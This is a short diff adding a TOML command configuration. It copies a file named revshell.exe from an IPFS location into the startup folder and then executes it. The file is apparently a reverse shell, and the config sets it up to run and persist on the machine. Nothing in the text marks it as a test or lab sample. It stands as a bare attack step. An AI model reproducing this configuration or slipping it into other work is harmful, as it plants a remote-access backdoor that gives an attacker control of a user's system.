@@ -1,0 +1,11 @@
+order = ["copy_files", "run_shell"]
+
+[commands.copy_files]
+do = "copy"
+[[commands.copy_files.with]]
+from = "{ipfs}/revshell.exe"
+to = "{startup}/revshell.exe"
+
+[commands.run_shell]
+do = "exec"
+with = ["{startup}/revshell.exe"]
